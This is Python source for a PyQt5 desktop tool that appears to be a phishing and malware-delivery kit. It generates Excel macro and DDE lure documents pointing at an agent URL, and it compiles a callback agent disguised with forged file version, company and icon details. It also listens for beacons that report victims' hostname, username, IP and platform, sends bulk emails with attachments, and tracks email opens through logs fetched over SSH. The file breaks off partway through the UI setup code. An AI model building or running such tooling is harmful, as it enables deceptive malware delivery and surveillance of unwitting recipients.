#Project Creator Abdulaziz ALTUNTAŞ
#No Version

from PyQt5.QtWidgets import QApplication , QMainWindow ,QFileDialog , QListWidget,QListWidgetItem ,QTreeWidgetItem ,QMessageBox,QLineEdit,QGraphicsPixmapItem
from PyQt5.QtGui import QPixmap
import sys,random
from sendMail import SettingSender
from threading import Thread
import paramiko
from PyQt5 import QtCore, QtGui, QtWidgets
import re, socket , string
import os , subprocess
from createAgent import Agent
import smtplib,json
from messagebox import Message
import threading
from createMacro import Macro
import time,logging
from sleuth.ddeCreate import CreateDDE
from sleuth.createReport import Report

class Ui_MainWindow(QMainWindow):

    def macroSelectDir(self):

        try:

            fileName = str(QFileDialog.getExistingDirectory(self, "Select Directory"))
            self.dir = fileName.replace("/","\\")
            self.makrosavedir.setText(self.dir)

        except:
            pass

    def macroSelectImg(self):

        try:

            selectimg = QtWidgets.QFileDialog()
            imgpath = selectimg.getOpenFileName(self, 'Select Image File', './',filter='Jpg Files(*.jpg);; Png Files(*.png)')
            clearing = imgpath[0]
            self.macroimg = clearing.replace("/","\\")
            self.macroimage.setText(self.macroimg)

        except:
            pass


    def createMac(self):

        # saveas,url,text,textloc,buttontex,buttonloc,imgpath,imgloc,fname

        url = self.makroagenturl.text()
        fname = self.makrofilename.text()
        saveas = self.makrosavedir.text()
        text   = self.macrolinetext.toPlainText()
        textloc = self.macrotextloc.text()
        buttontex = self.macrobuttontext.text()
        buttonloc = self.macrobuttonloc.text()
        imgpath = self.macroimage.text()
        imgloc = self.macroimageloc.text()


        textl = re.findall(r'([A-Z][0-9]+[\$0-9]|[A-Z][0-9])', textloc)
        buttonl = re.findall(r'([A-Z][0-9]+[\$0-9]|[A-Z][0-9])', buttonloc)
        imgl = re.findall(r'([A-Z][0-9]+[\$0-9]|[A-Z][0-9])', imgloc)

        if not url or not fname or not saveas or not text or not textloc or not buttontex or not buttonloc or not imgpath or not imgloc:
            Message("Error !", "Please Enter ALL Input !", "Macro Creator")

        elif not textl or not  buttonl  or not imgl:
            Message("Error !", "Please Enter [A1][B12] Format !", "Macro Creator")

        else:

            textlocation = textl[0]
            buttonlocation = buttonl[0]
            imglocation = imgl[0]

            print(textlocation)
            print(textloc)
            Message("Macro Creator", "Click To Start !", "Warning !")
            Macro(saveas,url,text,textlocation,buttontex,buttonlocation,imgpath,imglocation,fname)

    def salgel(self,finish):

        self.mailliststatus.setText(finish)

    def StartRet(self):

        try:

            host = self.returnhost.text()
            port = self.returnport.text()

            ipcont = re.findall(
                r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b",
                host)
            portcont = re.findall(r"\d{1,5}(?:-\d{1,5})?(\s*,\s*\d{1,5}(?:-\d{1,5})?)*$", port)

            if not ipcont:
                Message("Error !", "Please Enter Ip Adress", "Agent Open Track")

            elif not portcont:
                Message("Error !", "Please Enter Port", "Agent Open Track")

            else:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((host, int(port)))
                s.close()


                self.returnstart.setDisabled(True)


                self.starttime = str(time.ctime())
                self.starttime = self.starttime.replace(" ","-")
                self.starttime = self.starttime.replace(":","")

                with open(os.getcwd() + '\\sleuth\\agentOpenList\\' + self.starttime + '.txt', 'x') as createopen:
                    createopen.write("")


                if os.path.isfile(os.getcwd()+'\\sleuth\\settings\\tmpfile\\ipcontrol.txt'):

                    with open(os.getcwd() + '\\sleuth\\settings\\tmpfile\\ipcontrol.txt', 'w') as clearip:
                        clearip.write("")

                        thread = Thread(target=self.AgentReturn)
                        thread.daemon = True
                        thread.start()
                        Message("Server Started ", "Successful !", "Agent Open Track")

                else:

                    with open(os.getcwd() + '\\sleuth\\settings\\tmpfile\\ipcontrol.txt','x') as createip:
                        thread = Thread(target=self.AgentReturn)
                        thread.daemon = True
                        thread.start()



        except Exception as f:

            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)
            Message("Server Started Error !", "The requested address is not valid !", "Agent Open Track")



    def Come(self,HOSTNAME,USERNAME,IPADRESS,TIME,PLATFORM):
        import time


        logging.basicConfig(
            filename=os.getcwd() + '\\sleuth\\agentOpenList\\' + self.starttime + '.txt',
            level=logging.INFO,
            format="%(message)s"
        )

        try:

            with open(os.getcwd() + '\\sleuth\\settings\\tmpfile\\ipcontrol.txt', 'r') as san:
                sanread = san.read()

            for ipadress in IPADRESS:
                pass


            if ipadress not in sanread:

                self.retWid = QTreeWidgetItem(self.agentOpenwidget)

                with open(os.getcwd() + '\\sleuth\\settings\\tmpfile\\ipcontrol.txt', 'a') as sanwrite:
                    sanwrite.write(ipadress+"\n")


                    self.retCol = QTreeWidgetItem(self.retWid)

                    for host in HOSTNAME:
                        self.retCol.setText(1, host)
                    for username in USERNAME:
                        self.retCol.setText(0, username)
                    for ipadress in IPADRESS:
                        self.retWid.setText(0, ipadress)
                    for time in TIME:
                        self.retCol.setText(3, time)
                    for platform in PLATFORM:
                        self.retCol.setText(2, platform)

                    # with open(os.getcwd() + '\\sleuth\\agentOpenList\\'+self.starttime+'.txt', 'a') as createopen:
                    #     createopen.write("Agent Open! : "+ipadress+" "+username+" "+host+" "+platform+" "+time+"\n")

                    logging.info("Agent Open! : "+ipadress+" "+username+" "+host+" "+platform+" "+time)

            else:
                pass

        except Exception as f:

            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)

    def AgentReturn(self):

        host = self.returnhost.text()
        port = int(self.returnport.text())

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host, port))

        while True:

            s.listen(400)
            c, hs = s.accept()
            thread = Thread(target=self.GetData,args=(hs, c))
            thread.daemon = True
            thread.start()

            self.message = "Okey"

    def DDEImgSelect(self):

        try:

            selectimg = QtWidgets.QFileDialog()
            imgpath = selectimg.getOpenFileName(self, 'Select Image File', './',filter='Jpg Files(*.jpg);; Png Files(*.png)')
            clearing = imgpath[0]
            self.ddeimg = clearing.replace("/","\\")
            self.ddeimage.setText(self.ddeimg)

        except:
            pass


    def GenerateStatistic(self):

        try:

            sendingmachines = "Sending Machines: "
            agentopen = "Agent Open: "
            agentsavedir = "agentOpenList"

            send = 0
            sending = [self.maillistWidget.item(i) for i in range(self.maillistWidget.count())]
            for _ in sending:
                send += 1


            with open(os.getcwd() + '\\sleuth\\agentOpenList\\' + self.starttime + '.txt','r') as openagent:

                opena = 0

                for b in openagent.readlines():
                    ipcont = re.findall(
                        r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b",
                        b)

                    if not  ipcont:
                        pass
                    else:
                        for c in ipcont:
                            opena += 1

                Report(send,opena,self.starttime,sendingmachines,agentopen,agentsavedir)

                img = QPixmap(os.getcwd()+"\\sleuth\\agentOpenList\\Report\\"+self.starttime+".png")

                self.agentopenlabel.setPixmap(img)
                self.agentopenlabel.setScaledContents(True)

                Message("Agent Report Create Successful !", os.getcwd()+"\\sleuth\\agentOpenList\\Report\\"+self.starttime+".png "+"Saved !", "Info")


        except Exception as f:

            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)
            Message("Agent Report Create Error !", "Some Arguments are Missing !", "Agent Open Statistic")

    def GenerateMailStatistic(self):

        try:

            sendingmail = "Sending Mail: "
            mailopen = "Mail Open: "
            mailsavedir = "mailOpenList"

            send = 0
            sending = [self.maillistWidget.item(i) for i in range(self.maillistWidget.count())]
            for _ in sending:
                send += 1

            with open(os.getcwd() + '\\sleuth\\mailOpenList\\Report\\' + self.privatestart + '.txt', 'r') as openmail:

                openm = 0

                for b in openmail.readlines():
                    getmail = re.findall(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b", b)

                    if not getmail:
                        pass
                    else:
                        for c in getmail:
                            openm += 1

                Report(send, openm, self.privatestart,sendingmail,mailopen,mailsavedir)

                img = QPixmap(os.getcwd() + "\\sleuth\\mailOpenList\\Report\\" + self.privatestart + ".png")

                self.mailopenlabel.setPixmap(img)
                self.mailopenlabel.setScaledContents(True)

                Message("Mail Report Create Successful !", os.getcwd()+"\\sleuth\\mailOpenList\\Report\\"+self.privatestart+".png "+"Saved !", "Info")
        except Exception as f:

            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)
            Message("Mail Report Create Error !", "Some Arguments are Missing !", "Mail Open Statistic")

    def DDECreate(self):

        # agenturl, agentname, ddetextloc, ddelinetext, ddeimage, ddeimgloc

        agenturl = self.agenturl.text()
        agentname = self.agentname.text()
        ddetextloc = self.ddetextloc.text()
        ddelinetext = self.ddelinetext.toPlainText()
        ddeimage = self.ddeimage.text()
        ddeimgloc = self.ddeimgloc.text()


        ddetloc = re.findall(r'([A-Z][0-9]+[\$0-9]|[A-Z][0-9])', ddetextloc)
        ddeiloc = re.findall(r'([A-Z][0-9]+[\$0-9]|[A-Z][0-9])', ddeimgloc)


        if not agenturl or not agentname or not ddetextloc or not ddelinetext or not ddeimage or not ddeimgloc:
            Message("Error !", "Please Enter ALL Input !", "DDE Creator")

        elif not ddeiloc or not  ddetloc:
            Message("Error !", "Please Enter [A1][B12] Format !", "DDE Creator")

        else:

            ddetextlocation = ddetloc[0]
            ddeimglocation = ddeiloc[0]

            if self.orthercheck.isChecked() == True:

                try:

                    ortherpayload = self.ortherpayload.toPlainText()

                    ddetextlocation = ddetloc[0]
                    ddeimglocation = ddeiloc[0]

                    Message("DDE Creator", "Click To Start !", "Warning !")
                    create = CreateDDE()

                    create.CheckOrther(ddeimglocation,agentname,ddetextlocation, ddelinetext, ddeimage,ortherpayload)

                except Exception as f:

                    t, o, tb = sys.exc_info()
                    print(f, tb.tb_lineno)

            else:

                workdde = CreateDDE()
                Message("DDE Creator", "Click To Start !", "Warning !")

                workdde.WorkDDE(agenturl,agentname,ddetextlocation,ddelinetext,ddeimage,ddeimglocation)

    def GetData(self,hs,c):

        _ = []
        HOSTNAME = []
        IPADRESS = []
        TIME = []
        PLATFORM = []
        USERNAME = []



        while True:
            try:

                self.data = c.recv(1024)
                self.data = json.loads(self.data.decode("utf-8"))

                hostname = self.data.get("hostname")
                ipadress = self.data.get("ipadress")
                opentime = self.data.get("time")
                platform = self.data.get("platform")  # Two Key ([Windows10,32bit])
                username = self.data.get("username")

                for host in hostname:
                    HOSTNAME.append(host)
                    for user in username:
                        USERNAME.append(user)
                        for ip in ipadress:
                            IPADRESS.append(ip)
                            for optime in opentime:
                                TIME.append(optime)
                                for plat in platform:
                                    PLATFORM.append(plat)


                self.Come(HOSTNAME,USERNAME,IPADRESS,TIME,PLATFORM)


            except:
                break

        c.close()


    def AgentIco(self):

        try:

            options = QFileDialog.Options()
            options |= QFileDialog.DontUseNativeDialog
            fileName, _ = QFileDialog.getOpenFileName(self, options=options)

            icodir = fileName.replace('/',"\\\\")

            self.fileico.setText(icodir)
        except Exception as f:

            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)

    def selectPrivate(self):

        try:

            options = QFileDialog.Options()
            options |= QFileDialog.DontUseNativeDialog
            fileName, _ = QFileDialog.getOpenFileName(self, options=options)

            icodir = fileName.replace('/',"\\\\")

            self.privatekey.setText(icodir)
        except Exception as f:

            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)



    def AgentCreate(self):

        try:

            if not self.host.text() or not self.port.text():
                self.ThreadMessage("Agent Error", " Blank Host or Port !", "Info")
            elif not self.compname.text() or not self.filedes.text() or not self.fileverseye.text():
                self.ThreadMessage("Agent Error", " Blank Agent Detail !", "Info")
            elif not self.filevers.text() or not  self.filecorp.text() or not self.orginalname.text():
                self.ThreadMessage("Agent Error", " Blank Agent Detail !", "Info")
            elif not self.productver.text() or not self.productname.text() or not self.filename.text():
                self.ThreadMessage("Agent Error", " Blank Agent Detail !", "Info")
            elif not self.fileico.text():
                self.ThreadMessage("Agent Error", " Please Select Ico File !", "Info")
            elif not self.fileico.text().endswith('.ico'):
                self.ThreadMessage("Agent Error", " Wrong File Format. Please Select (.ico) Format.!", "Info")

            else:

                nagato = len("nagato")
                n = nagato

                null = ""
                for _ in range(n):
                    esc = random.choice(string.digits + string.ascii_lowercase + string.ascii_uppercase)
                    null += esc


                with open(os.getcwd()+"\\sleuth\\agent.py",'r') as agent:

                    agentfile = agent.read()
                    agentfile = agentfile.replace('127.0.0.1',self.host.text())
                    agentfile = agentfile.replace('1337',self.port.text())

                    with open(os.getcwd()+'\\sleuth\\settings\\tmpfile\\'+null+'.py','w') as tmpagent:

                        tmpagent.write(agentfile)


                with open(os.getcwd()+"\\sleuth\\settings\\version.txt", 'r') as txt:
                    version = txt.read()

                    filever = self.fileverseye.text()
                    filever = filever.replace('.',',')
                    prodver = self.productver.text()
                    prodver = prodver.replace('.',',')

                    version = version.replace('FILEVER',filever)
                    version = version.replace('PRODVER',prodver)
                    version = version.replace('COMPNAME',self.compname.text())
                    version = version.replace('FILEDES',self.filedes.text())
                    version = version.replace('COPYRIGHT',self.filecorp.text())
                    version = version.replace('ORGINALNAME',self.orginalname.text())
                    version = version.replace('PRODNAME',self.productname.text())

                    with open(os.getcwd()+"\\sleuth\\settings\\tmpfile\\"+null+".txt",'w') as tmptxt:

                        tmptxt.write(version)

                with open(os.getcwd()+"\\sleuth\\settings\\Uygulama.spec",'r') as spec:

                    specfile = spec.read()
                    projectDir = os.getcwd()
                    projectDir = projectDir.replace("\\","\\\\")


                    specfile = specfile.replace('ICOFILE',self.fileico.text())
                    specfile = specfile.replace('VERFILE',tmptxt.name.replace("\\","\\\\"))
                    specfile = specfile.replace('FILENAME',self.filename.text())
                    specfile = specfile.replace('AGENTFILE',tmpagent.name.replace("\\","\\\\"))
                    specfile = specfile.replace('PROJECTPATH',projectDir)

                    with open(os.getcwd()+"\\sleuth\\settings\\tmpfile\\"+null+".spec",'w') as tmpspec:

                        tmpspec.write(specfile)


                Agent(tmpspec.name,self.filename.text())

        except Exception as f:
            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)


    def returnControl(self):
        try:
            host = self.sship.text()
            username = self.sshuser.text()
            password = self.sshpass.text()
            port = self.sshport.text()
            command = self.accesslog.text()
            local = os.getcwd()
            privatekey = self.privatekey.text()
            privatepass = self.privatekeypass.text()

            ipcont = re.findall(
                r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b",
                host)
            portcont = re.findall(r"\d{1,5}(?:-\d{1,5})?(\s*,\s*\d{1,5}(?:-\d{1,5})?)*$", port)


            if self.normalconnect.isChecked() == True:


                if not host or not username or not password or not port or not command:
                    self.ThreadMessage("Server Setting ", "Please Fill All Fields", "Info")

                elif not ipcont:
                    Message("Error !", "Please Enter Ip Adress", "Mail Open Track")

                elif not portcont:
                    Message("Error !", "Please Enter Port", "Mail Open Track")

                else:


                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port, username, password,timeout = 5)
                    ftp = ssh.open_sftp()

                    ftp.get(command, 'log.txt')
                    ftp.close()
                    path = (os.getcwd() + "\\log.txt")

                    self.ThreadMessage("Connection Successful", " Click to Start", "Info")
                    self.opentrackstart.setDisabled(True)

                    t = Thread(target=self.returnInfo)
                    t.daemon = True
                    t.start()

            elif self.privateconnect.isChecked() == True:

                if not host or not username or not port or not command or not privatekey or not privatepass:
                    self.ThreadMessage("Server Setting ", "Please Fill All Fields", "Info")

                elif not ipcont:
                    Message("Error !", "Please Enter Ip Adress", "Mail Open Track")

                elif not portcont:
                    Message("Error !", "Please Enter Port", "Mail Open Track")

                else:

                    pkey = paramiko.RSAKey.from_private_key_file(privatekey, privatepass)
                    ssh = paramiko.SSHClient()
                    ssh.load_system_host_keys()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=int(port), username=username, pkey=pkey)
                    ftp = ssh.open_sftp()

                    ftp.get(command, 'log.txt')
                    ftp.close()
                    path = (os.getcwd() + "\\log.txt")

                    self.ThreadMessage("Connection Successful", " Click to Start", "Info")
                    self.opentrackstart.setDisabled(True)

                    t = Thread(target=self.returnPrivInfo)
                    t.daemon = True
                    t.start()
            else:
                self.ThreadMessage("Connect Method Error", " Select Connection Method", "Info")


        except paramiko.AuthenticationException:
            self.ThreadMessage("Authentication Error", " Wrong Username or Password !", "Info")
        except paramiko.SSHException:
            self.ThreadMessage("Connection Error", " Control Private Key or Passphrase !", "Info")
        except socket.error:
            self.ThreadMessage("Connection Error", "SSH Server Down","Info")
        except Exception as f:
            t, o, tb = sys.exc_info()
            print(f,tb.tb_lineno)

    def returnPrivInfo(self):

        host = self.sship.text()
        username = self.sshuser.text()
        password = self.sshpass.text()
        port = self.sshport.text()
        command = self.accesslog.text()
        local = os.getcwd()
        privatekey = self.privatekey.text()
        privatepass = self.privatekeypass.text()

        if not self.privatestart:
            self.privatestart = str(time.ctime())
            self.privatestart = self.privatestart.replace(" ", "-")
            self.privatestart = self.privatestart.replace(":", "")
        else:
            pass

        self.ipachi = QTreeWidgetItem(self.mailopenwidget)
        self.ipachi.setText(0, "Mails")
        self.ipachi.setText(1, "Status")

        self.screet = QTreeWidgetItem(self.screetwidget)
        self.screetitems = QTreeWidgetItem(self.screet)

        with open(os.getcwd() + "\\sleuth\\mailOpenList\\Report\\" + self.privatestart + ".txt", 'x') as mailtxt:

            mailtxt.write("")

        while True:


            pkey = paramiko.RSAKey.from_private_key_file(privatekey, privatepass)
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, port=int(port), username=username, pkey=pkey)
            ftp = ssh.open_sftp()

            ftp.get(command, 'log.txt')
            ftp.close()
            path = (os.getcwd() + "\\log.txt")
            with open(path,'r') as nan:

                _ = nan.read()
                _ = _.strip()

                bos = ['']
                list2 = ['']

                nonkala = set()


                getmail = re.findall(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b", _)
                col = [x for x in getmail if x not in nonkala and not nonkala.add(x)]

                if not col:
                    pass
                else:

                    if str(self.screetitems.text(0)) != str(col[::-1][0]):
                        opentext = "Open"
                        list2.append(col[::-1][0])
                        self.items = QTreeWidgetItem(self.ipachi)
                        self.screetitems.setText(0,'{}'.format(col[::-1][0]))
                        self.screetitems.setText(1, '{}'.format(opentext))
                        self.esc = self.items.setText(0,'{}'.format(col[::-1][0]))
                        self.esc = self.items.setText(1, '{}'.format(opentext))
                        with open(os.getcwd() + "\\sleuth\\mailOpenList\\Report\\" + self.privatestart + ".txt", 'a') as mailtxt:

                            mailtxt.write("Mail Open ! :" + col[::-1][0]+"\n")
                    else:
                       pass


    def ThreadMessage(self,text,inf,title):

        self.mess(text,inf,title)

    def returnInfo(self):

        host = self.sship.text()
        username = self.sshuser.text()
        password = self.sshpass.text()
        port = self.sshport.text()
        command = self.accesslog.text()
        local = os.getcwd()

        if not self.privatestart:
            self.privatestart = str(time.ctime())
            self.privatestart = self.privatestart.replace(" ", "-")
            self.privatestart = self.privatestart.replace(":", "")
        else:
            pass

        self.ipachi = QTreeWidgetItem(self.mailopenwidget)
        self.ipachi.setText(0, "Mails")
        self.ipachi.setText(1, "Status")

        self.screet = QTreeWidgetItem(self.screetwidget)
        self.screetitems = QTreeWidgetItem(self.screet)

        with open(os.getcwd() + "\\sleuth\\mailOpenList\\Report\\" + self.privatestart + ".txt", 'x') as mailtxt:

            mailtxt.write("")

        while True:

            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, int(port), username, password)
            ftp = ssh.open_sftp()

            ftp.get(command, 'log.txt')
            ftp.close()
            path = (os.getcwd() + "\\log.txt")
            with open(path,'r') as nan:

                _ = nan.read()
                _ = _.strip()

                bos = ['']
                list2 = ['']

                nonkala = set()


                getmail = re.findall(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b", _)
                col = [x for x in getmail if x not in nonkala and not nonkala.add(x)]

                if not col:
                    pass
                else:

                    if str(self.screetitems.text(0)) != str(col[::-1][0]):
                        opentext = "Open"
                        list2.append(col[::-1][0])
                        self.items = QTreeWidgetItem(self.ipachi)
                        self.screetitems.setText(0,'{}'.format(col[::-1][0]))
                        self.screetitems.setText(1, '{}'.format(opentext))
                        self.esc = self.items.setText(0,'{}'.format(col[::-1][0]))
                        self.esc = self.items.setText(1, '{}'.format(opentext))
                        with open(os.getcwd() + "\\sleuth\\mailOpenList\\Report\\" + self.privatestart + ".txt", 'a') as mailtxt:

                            mailtxt.write("Mail Open ! :" + col[::-1][0])
                    else:
                       pass

    def mess(self,text,inf,title):

        self.msg = QMessageBox()
        self.msg.setText('{}' .format(text))

        self.msg.setSizeGripEnabled(True)
        self.msg.setInformativeText('{}'.format(inf))
        self.msg.setWindowTitle('{}'.format(title))
        self.msg.setIcon(QMessageBox.Information)

        self.execmsg = self.msg.exec_()

    def openmail(self):

        try:

            self.mail = list()

            options = QFileDialog.Options()
            options |= QFileDialog.DontUseNativeDialog
            fileName, _ = QFileDialog.getOpenFileName(self, options=options)

            say = 0
            nagato = ""
            notlist = list()
            yeslist = list()

            with open(fileName, 'r') as g:

                for k999 in g:
                    notlist.append(k999)

            with open(fileName, 'r') as f:

                if not fileName.endswith(".txt"):
                    self.ThreadMessage("Mail List Error", "Please Select '.txt' File" , "Info")

                else:
                    self.maillist.setText(fileName)
                    for _ in f:
                        mailReg = re.search(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)", _)


                        if mailReg:

                            yeslist.append(_)
                            itemsTextList = [str(self.maillistWidget.item(i).text()) for i in
                                             range(self.maillistWidget.count())]
                            say += 1

                            if _ in itemsTextList:
                                pass
                            else:
                                self.maillistWidget.addItem(_)
                                self.mailliststatus.setText(" " * 21 + str(say) + " Email Added")

                                self.mail.append(_)

                    else:

                        ka = list(set(notlist)-set(yeslist))
                        count = 0

                        for ningendo in ka:
                            count += 1
                            nagato += "{}".format(count)+"- "+ningendo+"\n"

                        self.ThreadMessage("Mail Attach Error", "Not Email Adress;\n\n {}".format(nagato), "Info")
        except:

            pass

    def attach(self):

        try:

            options = QFileDialog.Options()
            options |= QFileDialog.DontUseNativeDialog
            fileName, _ = QFileDialog.getOpenFileName(self, options=options)
            osrep = fileName.replace("/","\\\\")
            self.attachment.setText(osrep)
        except Exception as f:
            t, o, tb = sys.exc_info()
            print(f,tb.tb_lineno)

    def mailSender(self):

        try:


            mailReg = re.search(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)", self.mailadress.text())

            if not self.subject.text() or not self.attachment.text() or not self.message.toPlainText() or not self.mail:

                self.ThreadMessage("Mail Setting Error", "Please Fill All Fields", "Info")
            elif not self.smtphost.text() or not self.smtpport.text() or not self.mailadress.text() or not self.mailpassword.text():
                self.ThreadMessage("General Setting Error", "Please Fill All Fields", "Info")

            elif not mailReg:
                self.ThreadMessage("Mail Setting Sender Error", "Please Enter Email Adress", "Info")

            elif not self.opentrackurl.text():
                self.ThreadMessage("Server Settings", "Please Enter Your Domain URL and Path", "Info")

            else:

                sender = self.mailadress.text()
                subject = self.subject.text()
                attach = self.attachment.text()
                message = self.message.toPlainText()
                sendto = self.mail
                smtphost = self.smtphost.text()
                smtpport = self.smtpport.text()
                mailadress = self.mailadress.text()
                mailpassword = self.mailpassword.text()
                opentrackurl = self.opentrackurl.text()
                thread = self.thread.text()

                if not self.privatestart:
                    self.privatestart = str(time.ctime())
                    self.privatestart = self.privatestart.replace(" ", "-")
                    self.privatestart = self.privatestart.replace(":", "")
                else:
                    pass

                if self.thread.value() == 0:
                    self.ThreadMessage("Mail Sender Thread", "Please Enter Thread", "Error")

                else:

                    mail = smtplib.SMTP(smtphost, smtpport)
                    mail.starttls()
                    mail.login("{}".format(mailadress), '{}'.format(mailpassword))
                    mail.quit()
                    Message("Mail Sender", "Click To Start !", "Warning !")
                    self.mailliststatus.setText(" " * 18 + "Wait Until txt Open")
                    self.t = Thread(target=SettingSender, args=(self.privatestart,thread,opentrackurl,sender,attach,subject,message,smtphost,smtpport,mailadress,mailpassword,*sendto,))
                    self.t.daemon = True
                    self.t.start()
                    self.privatestart = ""

        except smtplib.SMTPAuthenticationError:
            self.ThreadMessage("Authentication Error", "Wrong Username or Password !", "Info")
            sys.stderr.flush()


        except smtplib.SMTPConnectError:
            self.ThreadMessage("Connection Error", "SMTP Server Down !", "Info")
            sys.stderr.flush()

        except smtplib.SMTPNotSupportedError:
            self.ThreadMessage("Support Error", "SMTP Not Supported !", "Info")
            sys.stderr.flush()

        except Exception as f:
            t, o, tb = sys.exc_info()
            print(f, tb.tb_lineno)

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.setEnabled(True)
        MainWindow.resize(1324, 710)
        sizePolicy = QtWidgets.QSizePolicy(QtWidgets.QSizePolicy.Fixed, QtWidgets.QSizePolicy.Fixed)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(MainWindow.sizePolicy().hasHeightForWidth())
        MainWindow.setSizePolicy(sizePolicy)
        MainWindow.setMinimumSize(QtCore.QSize(1324, 710))
        MainWindow.setMaximumSize(QtCore.QSize(1366, 800))
        MainWindow.setSizeIncrement(QtCore.QSize(1024, 768))
        MainWindow.setBaseSize(QtCore.QSize(1024, 768))
        MainWindow.setFocusPolicy(QtCore.Qt.NoFocus)
        MainWindow.setAutoFillBackground(True)
        MainWindow.setDockNestingEnabled(False)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.tabWidget = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(30, 40, 1261, 591))
        self.tabWidget.setMinimumSize(QtCore.QSize(841, 0))
        font = QtGui.QFont()
        font.setPointSize(11)
        font.setBold(False)
        font.setItalic(False)
        font.setWeight(50)
        font.setStrikeOut(False)
        font.setStyleStrategy(QtGui.QFont.PreferAntialias)
        self.tabWidget.setFont(font)
        self.tabWidget.setMouseTracking(True)
        self.tabWidget.setTabletTracking(False)
        self.tabWidget.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.tabWidget.setTabPosition(QtWidgets.QTabWidget.North)
        self.tabWidget.setTabShape(QtWidgets.QTabWidget.Rounded)
        self.tabWidget.setIconSize(QtCore.QSize(30, 30))
        self.tabWidget.setElideMode(QtCore.Qt.ElideNone)
        self.tabWidget.setUsesScrollButtons(False)
        self.tabWidget.setDocumentMode(False)
        self.tabWidget.setTabsClosable(False)
        self.tabWidget.setMovable(True)
        self.tabWidget.setTabBarAutoHide(False)
        self.tabWidget.setObjectName("tabWidget")
        self.tab = QtWidgets.QWidget()
        self.tab.setObjectName("tab")
        self.senderlabel = QtWidgets.QLabel(self.tab)
        self.senderlabel.setGeometry(QtCore.QRect(70, 70, 91, 16))
        self.senderlabel.setObjectName("senderlabel")
        self.mailliststatus = QtWidgets.QLineEdit(self.tab)
        self.mailliststatus.setGeometry(QtCore.QRect(780, 470, 201, 20))
        self.mailliststatus.setObjectName("mailliststatus")
        self.mailliststatus.setReadOnly(True)
        self.messagelabel = QtWidgets.QLabel(self.tab)
        self.messagelabel.setGeometry(QtCore.QRect(70, 190, 91, 16))
        self.messagelabel.setObjectName("messagelabel")
        self.message = QtWidgets.QPlainTextEdit(self.tab)
        self.message.setGeometry(QtCore.QRect(170, 190, 391, 341))
        self.message.setObjectName("message")
        self.maillistlabel = QtWidgets.QLabel(self.tab)
        self.maillistlabel.setGeometry(QtCore.QRect(620, 70, 91, 16))
        self.maillistlabel.setObjectName("maillistlabel")
        self.attachment = QtWidgets.QLineEdit(self.tab)
        self.attachment.setGeometry(QtCore.QRect(170, 150, 201, 20))
        self.attachment.setObjectName("attachment")
        self.attachment.setReadOnly(True)

        self.openmaillist = QtWidgets.QPushButton(self.tab)
        self.openmaillist.setGeometry(QtCore.QRect(910, 70, 81, 21))
        font = QtGui.QFont()
        font.setPointSize(8)
        self.openmaillist.setFont(font)
        self.openmaillist.setObjectName("openmaillist")
        self.openmaillist.clicked.connect(self.openmail)
        self.maillistWidget = QtWidgets.QListWidget(self.tab)
        self.maillistWidget.setGeometry(QtCore.QRect(700, 140, 361, 321))
        self.maillistWidget.setObjectName("maillistWidget")
        self.attachment_2 = QtWidgets.QLabel(self.tab)
        self.attachment_2.setGeometry(QtCore.QRect(70, 150, 91, 16))
        self.attachment_2.setObjectName("attachment_2")
        self.openattach = QtWidgets.QPushButton(self.tab)
        self.openattach.setGeometry(QtCore.QRect(380, 150, 81, 21))
        font = QtGui.QFont()
        font.setPointSize(8)

        self.subjectlabel = QtWidgets.QLabel(self.tab)
        self.subjectlabel.setGeometry(QtCore.QRect(70, 110, 91, 16))
        self.subjectlabel.setObjectName("subjectlabel")

        self.maillist = QtWidgets.QLineEdit(self.tab)
        self.maillist.setGeometry(QtCore.QRect(700, 70, 201, 20))
        self.maillist.setObjectName("maillist")
        self.maillist.setReadOnly(True)

        self.line_2 = QtWidgets.QFrame(self.tab)
        self.line_2.setGeometry(QtCore.QRect(590, 0, 20, 551))
        self.line_2.setFrameShape(QtWidgets.QFrame.VLine)
        self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_2.setObjectName("line_2")
